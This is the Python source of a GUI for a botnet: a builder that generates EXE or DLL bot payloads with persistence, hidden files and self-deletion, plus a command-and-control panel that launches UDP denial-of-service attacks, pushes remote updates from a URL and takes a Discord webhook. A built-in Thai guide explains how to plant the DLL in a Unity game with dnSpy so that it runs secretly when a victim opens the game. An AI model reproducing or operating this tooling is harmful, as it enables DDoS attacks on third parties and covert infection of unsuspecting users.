import customtkinter as ctk
import threading
from tkinter import messagebox, filedialog
from .utils import check_compiler
from .builder import build_payload
from .server import CNCServer

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class BotNetApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Basic-C-Bot-net (Refactored)")
        self.geometry("1200x950")
        
        # Backend Logic
        self.server = CNCServer(self.update_log, self.register_agent_ui)
        
        # UI Layout
        self.grid_columnconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        
        self.setup_builder_ui()
        self.setup_cnc_ui()
        
        # Start compiler check
        threading.Thread(target=lambda: check_compiler(self.update_log), daemon=True).start()

        # Input Handling
        self.bind_all("<Control-v>", self.paste_text)
        self.bind_all("<Control-V>", self.paste_text)
        self.bind_all("<Control-c>", lambda e: self.focus_get().event_generate("<<Copy>>"))
        self.bind_all("<Control-C>", lambda e: self.focus_get().event_generate("<<Copy>>"))
        self.bind_all("<Control-a>", self.select_all)
        self.bind_all("<Control-A>", self.select_all)

    def paste_text(self, event):
        focused = self.focus_get()
        if focused:
            try:
                clipboard = self.clipboard_get()
                if isinstance(focused, ctk.CTkEntry) or hasattr(focused, 'insert'):
                    if hasattr(focused, 'delete'):
                        try:
                            if focused.selection_get():
                                focused.delete("sel.first", "sel.last")
                        except: pass
                    focused.insert("insert", clipboard)
                elif hasattr(focused, 'event_generate'):
                    focused.event_generate("<<Paste>>")
            except: pass
        return "break"

    def select_all(self, event):
        focused = self.focus_get()
        if focused:
            if hasattr(focused, 'select_range'):
                focused.select_range(0, 'end')
                if hasattr(focused, 'icursor'): focused.icursor('end')
            elif hasattr(focused, 'tag_add'):
                focused.tag_add("sel", "1.0", "end")
        return "break"

    def update_log(self, msg):
        self.res_box.insert("end", msg + "\n")
        self.res_box.see("end")

    def paste_to(self, widget):
        try:
            widget.delete(0, 'end')
            widget.insert(0, self.clipboard_get())
        except: pass

    def setup_builder_ui(self):
        frame = ctk.CTkFrame(self, corner_radius=10)
        frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        ctk.CTkLabel(frame, text="🛠 ADVANCED BUILDER", font=("Arial", 20, "bold")).pack(pady=15)
        
        # Basic Settings
        self.ip_in = self.create_input(frame, "C&C IP", "127.0.0.1")
        self.port_in = self.create_input(frame, "C&C Port", "9999")
        self.name_in = self.create_input(frame, "Final File Name", "win_mgr")

        # File Type
        type_frame = ctk.CTkFrame(frame, fg_color="transparent")
        type_frame.pack(pady=10)
        self.file_type = ctk.CTkSegmentedButton(type_frame, values=["EXE", "DLL"])
        self.file_type.set("EXE")
        self.file_type.pack(side="left", padx=10)
        ctk.CTkButton(type_frame, text="❓ DLL Guide", width=80, fg_color="#8E44AD", command=self.show_dll_tutorial).pack(side="left")

        # Stealth Settings
        ctk.CTkLabel(frame, text="Stealth Options (EXE Only):", font=("Arial", 14, "bold"), text_color="cyan").pack(pady=5)
        self.check_persist = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(frame, text="Enable Persistence", variable=self.check_persist).pack(anchor="w", padx=50)
        
        self.drop_loc = ctk.CTkSegmentedButton(frame, values=["AppData", "LocalAppData", "Temp", "Startup"])
        self.drop_loc.set("LocalAppData")
        self.drop_loc.pack(pady=5, padx=50, fill="x")
        
        self.check_hide = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(frame, text="Set Hidden/System", variable=self.check_hide).pack(anchor="w", padx=50)
        
        self.check_self_del = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(frame, text="Self-Delete Original", variable=self.check_self_del).pack(anchor="w", padx=50)

        # Features
        ctk.CTkLabel(frame, text="Features to Include:", font=("Arial", 14, "bold")).pack(pady=5)
        self.feat_dos = ctk.BooleanVar(value=True)
        ctk.CTkCheckBox(frame, text="UDP DOS (Enabled by default)", variable=self.feat_dos, state="disabled").pack(anchor="w", padx=50)

        ctk.CTkButton(frame, text="GENERATE PAYLOAD", fg_color="green", height=50, command=self.on_build).pack(pady=20)

    def create_input(self, parent, placeholder, default=""):
        f = ctk.CTkFrame(parent, fg_color="transparent")
        f.pack(pady=2)
        entry = ctk.CTkEntry(f, placeholder_text=placeholder, width=150)
        entry.pack(side="left")
        entry.insert(0, default)
        ctk.CTkButton(f, text="📋", width=30, command=lambda: self.paste_to(entry)).pack(side="left", padx=2)
        return entry

    def setup_cnc_ui(self):
        frame = ctk.CTkFrame(self, corner_radius=10)
        frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
        ctk.CTkLabel(frame, text="📡 COMMAND & CONTROL", font=("Arial", 20, "bold")).pack(pady=10)
        
        self.agent_scroll = ctk.CTkScrollableFrame(frame, height=150)
        self.agent_scroll.pack(pady=5, padx=20, fill="x")
        
        # Quick DOS Panel
        dos_p = ctk.CTkFrame(frame, fg_color="#1a1a1a", border_width=1, border_color="#e74c3c")
        dos_p.pack(pady=10, padx=20, fill="x")
        ctk.CTkLabel(dos_p, text="🚀 QUICK DOS", font=("Arial", 12, "bold"), text_color="#e74c3c").pack(pady=2)
        
        dos_f1 = ctk.CTkFrame(dos_p, fg_color="transparent")
        dos_f1.pack(pady=2)
        self.dos_ip = ctk.CTkEntry(dos_f1, placeholder_text="Target IP", width=150); self.dos_ip.pack(side="left", padx=2)
        self.dos_port = ctk.CTkEntry(dos_f1, placeholder_text="Port", width=60); self.dos_port.pack(side="left", padx=2); self.dos_port.insert(0, "80")
        self.dos_sz = ctk.CTkEntry(dos_f1, placeholder_text="Size", width=70); self.dos_sz.pack(side="left", padx=2); self.dos_sz.insert(0, "1024")
        
        dos_f2 = ctk.CTkFrame(dos_p, fg_color="transparent")
        dos_f2.pack(pady=5)
        ctk.CTkButton(dos_f2, text="START ATTACK", fg_color="#e74c3c", hover_color="#c0392b", width=140, height=30, command=self.on_quick_dos).pack(side="left", padx=5)
        ctk.CTkButton(dos_f2, text="STOP ATTACK", fg_color="#7f8c8d", hover_color="#95a5a6", width=140, height=30, command=lambda: self.server.send_command("STOP_DOS")).pack(side="left", padx=5)

        # Other Commands
        ctk.CTkLabel(frame, text="🎮 OTHER COMMANDS", font=("Arial", 12, "bold")).pack(pady=5)
        
        self.webhook_in = self.create_input_large(frame, "Discord Webhook URL")
        self.path_in = self.create_input_large(frame, "Path / Update URL")
        
        btn_f = ctk.CTkFrame(frame, fg_color="transparent"); btn_f.pack(pady=5)
        ctk.CTkButton(btn_f, text="UPDATE", width=180, fg_color="orange", command=lambda: self.server.send_command("UPDATE", self.path_in.get())).pack(side="left", padx=5)
        ctk.CTkButton(btn_f, text="KILL BOT", width=180, fg_color="red", command=lambda: self.server.send_command("STOP")).pack(side="left", padx=5)
        
        self.srv_btn = ctk.CTkButton(frame, text="START CNC SERVER", height=40, font=("Arial", 14, "bold"), command=self.toggle_server_ui)
        self.srv_btn.pack(pady=10)

        self.res_box = ctk.CTkTextbox(frame, height=250)
        self.res_box.pack(pady=10, padx=20, fill="x")

    def create_input_large(self, parent, placeholder):
        f = ctk.CTkFrame(parent, fg_color="transparent")
        f.pack(pady=2)
        entry = ctk.CTkEntry(f, placeholder_text=placeholder, width=350)
        entry.pack(side="left")
        ctk.CTkButton(f, text="PASTE", width=50, command=lambda: self.paste_to(entry)).pack(side="left", padx=5)
        return entry

    def on_build(self):
        build_payload(
            self.ip_in.get(), 
            self.port_in.get(), 
            self.name_in.get(),
            self.file_type.get(),
            self.drop_loc.get(),
            self.check_persist.get(),
            self.check_hide.get(),
            self.check_self_del.get()
        )

    def toggle_server_ui(self):
        if not self.server.is_running:
            try:
                port = int(self.port_in.get())
                self.server.start(port)
                self.srv_btn.configure(text="SERVER ONLINE", fg_color="green")
            except ValueError:
                messagebox.showerror("Error", "Invalid Port Number")
        else:
            self.server.is_running = False
            self.srv_btn.configure(text="START CNC SERVER", fg_color=["#3B8ED0", "#1F6AA5"])

    def register_agent_ui(self, sock, addr, info):
        self.after(0, self._add_agent_to_list, sock, addr, info)

    def _add_agent_to_list(self, sock, addr, info):
        var = ctk.BooleanVar(value=True)
        cb = ctk.CTkCheckBox(self.agent_scroll, text=f"{addr[0]} | {info}", variable=var)
        cb.pack(anchor="w", padx=10, pady=2)
        self.server.add_agent(sock, {"var": var, "cb": cb})
        self.update_log(f"[+] Connected: {addr[0]} ({info})")

    def on_quick_dos(self):
        target = f"{self.dos_ip.get()}:{self.dos_port.get()}:{self.dos_port.get()}:{self.dos_sz.get()}:0"
        self.server.send_command("DOS", target)
        self.update_log(f"[*] Quick DOS Attack sent to agents -> {target}")

    def show_dll_tutorial(self):
        tut_text = """
### วิธีการฝัง DLL ลงในเกม Unity (ด้วย dnSpy) ###

1. สร้าง Payload แบบ DLL: 
   - เลือกโหมด "DLL" ในหน้า Builder แล้วกด Generate จะได้ไฟล์เช่น win_mgr.dll

2. เปิดเกมด้วย dnSpy:
   - โหลดโปรแกรม dnSpy แล้วลากไฟล์ Assembly-CSharp.dll ของเกมเป้าหมายมาใส่
   - ไฟล์นี้จะอยู่ในโฟลเดอร์: [ชื่อเกม]_Data\\Managed\\

3. หาจุดฝังตัว (Entry Point):
   - ค้นหา Class หลักที่ถูกเรียกใช้งานตอนเปิดเกม (เช่น MainMenu, GameManager)
   - หาฟังก์ชัน Start() หรือ Awake() ใน Class นั้น

4. แทรกโค้ดเรียก DLL:
   - คลิกขวาที่ฟังก์ชัน เลือก "Edit Method (C#)..."
   - แทรกโค้ดประกาศ DLL ไว้ด้านบน (ใน Class):
     [System.Runtime.InteropServices.DllImport("win_mgr.dll")]
     public static extern void thread_logic(IntPtr arg);
   - แทรกโค้ดเรียกใช้ ไว้ในฟังก์ชัน (เช่น Start):
     thread_logic(IntPtr.Zero);

5. บันทึกและวางไฟล์:
   - กด Compile ใน dnSpy แล้วกด File -> Save Module เพื่อบันทึกทับไฟล์เดิม
   - นำไฟล์ win_mgr.dll ของเรา ไปวางไว้ในโฟลเดอร์เดียวกับตัวรันเกม (.exe)

เมื่อเป้าหมายเปิดเกม DLL ของเราจะถูกรันเบื้องหลังทันที!
"""
        top = ctk.CTkToplevel(self)
        top.title("Unity DLL Injection Guide")
        top.geometry("600x450")
        txt = ctk.CTkTextbox(top, width=580, height=430)
        txt.pack(padx=10, pady=10)
        txt.insert("0.0", tut_text)
        txt.configure(state="disabled")
